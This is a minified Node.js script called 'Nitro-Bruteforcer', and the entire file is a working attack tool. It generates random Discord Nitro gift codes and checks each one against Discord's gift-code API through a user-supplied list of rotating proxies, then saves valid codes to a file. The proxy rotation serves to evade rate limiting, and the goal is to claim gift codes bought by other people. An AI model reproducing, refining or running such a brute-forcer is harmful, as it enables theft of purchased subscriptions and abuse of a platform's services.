const e = require("readline").createInterface({
    input: process.stdin,
    output: process.stdout
}),
t = require("gradient-string")("#00376e", "#0080ff"),
o = require("gradient-string")("#7e0000", "#ff0000"),
s = require("request"),
n = require("fs"),
r = '\n                                           ╓╖,\n               g▄▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▄╬╣╣╣╢╬N╖\n              ▐▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╣╣╣╣╣╣╣╣╣╢╣╣@,\n               ▀▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╣╣╣╣╣╣╣╢╢╣╣╣╣╣@,\n                        ╙▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╣╣╣╣╣╣╢╣╣╣╣╣╣╣╣╣╣W\n                        g▓▓▓▓▓▓╢▓▓▓▓╩╨╨╩╬╣╢╣╢╣▒╣╣╣╣╣╣╣╣╣╣╣╣\n Æ▓▓▓▓⌐   ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╢▓▓╝⌠░░░░░░░░░░╙╨╣╣╣╣╣╣╣╣╣╣╣╣╣╣╣\n ╙▀▓▓▀    ╙▀▓▓▓▓▓▓▓▓▓▓▓▓▓▓╢▓▓╩░░░░░░░░░░░░░░░░╙╣╣╣╣╣╣╣╣╣╣╣╣╣@\n                     ▓▓▓▓╢▓▓░░░░░╓╢▒▒▒▒▒▒╢░░░░░╙╣╣╣╣╣╣╣╣╣╣╣╣╢\n               g▄▄▄▄▄▓▓▓▓▓▓Ñ░░░░║▒▒▒▒▒▒▒▒▒▒╖░░░░║╣╣╣╣╣╣╣╣╣╣╣╣⌐\n              ▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░║▒▒▒▒▒▒▒▒▒▒▒▒▒░░░]╣╣╣╣╣╣╣╣╣╣╣╣⌐\n               ╙╙▐▓▓▓▓▓▓▓▓▓@░░░░╙▒▒▒▒▒▒▒▒▒▒╜░░░░║╣╣╣╣╣╣╣╣╣╣╣╣\n                  ▓▓▓▓▓▓▓╣▓▓░░░░░╙▒▒▒▒▒▒▒▒░░░░░╓╣╣╣╣╣╣╣╣╣╣╣╣Ñ\n                  ╚▓▓▓▓▓▓▓▓▓▓@░░░░░░░░░░░░░░░░░░░╢╣╣╣╣╣╣╣╣╣╣\n                   ▐▓▓▓▓▓▓▓▓╢▓▓@µ░░░░░░░░░░╓@░░░░░░╙╣╣╣╣╣╣╢`\n                    ╙▓▓▓▓▓▓▓▓▓▓╢▓▓▓▓@@@@▓▓▓▓╢▓▄░░░░░░░╜╨╣╢░\n                      ▀▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▄░░░░░░░▒\n                         ▀▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╜"░▒░"\n                           ▀▀▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▀╩\n                               ╙╙▀▀▀▓▓▓▓▀▀▀╙╙\n   \n';
"win32" == process.platform ? process.title = ">_Nitro-Bruteforcer" : process.stdout.write("]2;>_Nitro-Bruteforcer\\");
let i = 0;
setInterval((() => {
0 == i && (console.clear(), console.log(t(r)), e.question(t("\tWhat is the name of the proxy list : "), (l => {
    e.question(t("\tWhat is the type of proxies : "), (c => {
        if (l && n.existsSync("./input/" + l)) {
            let a = 0;
            setInterval((() => {
                0 == a && (console.clear(), console.log(t(r)), e.question(t("\tDo you want to bruteforce a classic nitro or a nitro game [classic/game] : "), (e => {
                    var u = 0;
                    if (e.startsWith("c") ? u = 16 : e.startsWith("g") && (u = 24), u) {
                        n.readFile("./input/" + l, "utf-8", ((e, l) => {
                            !e && l ? (console.clear(), console.log(o(r)), setInterval((() => {
                                l.replace(/\r|\"/gi, "").split("\n").forEach((e => {
                                    var r = function () {
                                        var e = "";
                                        for (let t = 0; t < u; t++) e += "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" [Math.floor(62 * Math.random())];
                                        return e
                                    }();
                                    s({
                                        url: `https://discordapp.com/api/v9/entitlements/gift-codes/${r}?with_application=false&with_subscription_plan=true`,
                                        method: "GET",
                                        proxy: String(c + "://" + e)
                                    }, (function (s, i, l) {
                                        try {
                                            s ? console.log(o(`[request] => ${c}://${e} => https://discord.com/gifts/${r} => invalid`)) : 200 == i.statusCode ? (console.log(t(`[request] => ${c}://${e} => https://discord.com/gifts/${r} => valid`)), n.appendFileSync("./output/valid.txt", r + "\n", (e => {}))) : console.log(o(`[request] => ${c}://${e} => https://discord.com/gifts/${r} => invalid`))
                                        } catch {
                                            console.log(o(`[request] => ${c}://${e} => https://discord.com/gifts/${r} => invalid`))
                                        }
                                    }))
                                }))
                            }), 5e3)) : (console.clear(), console.log(o(r + "\n\tAn error has been occurred")), setTimeout((() => {
                                i = 0
                            }), 2e3))
                        }))
                    } else console.clear(), console.log(o(r + "\n\tPlease enter a valid answer")), setTimeout((() => {
                        a = 0
                    }), 2e3)
                }))), a = 1
            }), 1e3)
        } else console.clear(), console.log(o(r + "\n\tPlease put a valid proxy list name")), setTimeout((() => {
            i = 0
        }), 2e3)
    }))
}))), i = 1
}), 1e3);